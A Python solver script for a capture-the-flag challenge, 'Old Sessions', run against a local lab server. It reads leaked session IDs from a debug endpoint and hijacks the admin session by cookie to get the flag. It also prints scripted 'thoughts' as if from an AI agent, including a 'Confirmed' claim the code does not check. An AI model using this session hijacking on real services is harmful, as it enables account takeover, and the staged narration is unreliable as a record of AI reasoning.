import sys
import os
import time
import requests
import re

# DEBUG_DELAY: set to 0 for fast automation, 1 for human-readable output
DEBUG_DELAY = float(os.getenv("DEBUG_DELAY", "0"))

# JARVIS STYLE LOGGING
def jarvis_log(type, msg):
    colors = {
        "thought": "\033[1;33m[THINK]\033[0m",
        "action": "\033[1;34m[ACTION]\033[0m",
        "tool": "\033[1;36m[TOOL]\033[0m",
        "observation": "\033[1;32m[OBS]\033[0m",
        "flag": "\033[1;32m[🚩 FLAG]\033[0m"
    }
    print(f"{colors.get(type, '[LOG]')} {msg}")
    if DEBUG_DELAY > 0:
        time.sleep(DEBUG_DELAY)

print("\033[1;32m[JARVIS] ASSISTED MODE ACTIVATED\033[0m")
print("[JARVIS] Sir, I have analyzed the 'Old Sessions' challenge. Let's proceed with the exploitation.")

# STEP 1: Recon
jarvis_log("thought", "Analyzing the challenge description. It mentions 'session timeout controls' and 'checking out a new platform'.")
jarvis_log("action", "Searching for hidden endpoints or debug pages.")
jarvis_log("tool", "curl http://localhost:5001/")

r1 = requests.get("http://localhost:5001/")
jarvis_log("observation", "Homepage loaded. Found link to '/sessions' (public sessions list for debugging).")

# STEP 2: Exploit Discovery
jarvis_log("thought", "The /sessions endpoint is extremely suspicious. It might leak session identifiers.")
jarvis_log("action", "Accessing /sessions to list active identifiers.")
jarvis_log("tool", "curl http://localhost:5001/sessions")

r2 = requests.get("http://localhost:5001/sessions")
jarvis_log("observation", f"Found active sessions:\n{r2.text}")

# Parse admin session ID dynamically from the /sessions response
# Try to extract the first session that looks like an admin session
admin_sid = None

# Strategy 1: look for 'admin' keyword in any session line
for line in r2.text.splitlines():
    line = line.strip()
    if "admin" in line.lower() and line:
        # Extract alphanumeric session token from the line
        match = re.search(r'[a-zA-Z0-9_\-]{8,}', line)
        if match:
            admin_sid = match.group(0)
            break

# Strategy 2: fallback — grab first non-empty token if no admin label found
if not admin_sid:
    tokens = [t.strip() for t in r2.text.split() if len(t.strip()) > 5]
    if tokens:
        admin_sid = tokens[0]

if not admin_sid:
    jarvis_log("observation", "Could not parse a session ID from /sessions response. Aborting.")
    sys.exit(1)

jarvis_log("thought", f"Confirmed: The admin session ID is '{admin_sid}'. I can perform session hijacking by setting this cookie.")

# STEP 3: Final Exploitation
jarvis_log("action", "Hijacking admin session via cookie manipulation.")
jarvis_log("tool", f"curl --cookie 'session={admin_sid}' http://localhost:5001/")

r3 = requests.get("http://localhost:5001/", cookies={"session": admin_sid})
flag_match = re.search(r"picoCTF\{[^\}]+\}", r3.text)

if flag_match:
    flag = flag_match.group(0)
    jarvis_log("observation", "Administrative access granted. Flag visible on dashboard.")
    jarvis_log("flag", flag)
    print(f"\n[JARVIS] System secured, sir. Challenge 'Old Sessions' has been successfully solved.")
else:
    jarvis_log("observation", "Failed to retrieve flag. Session might have expired.")

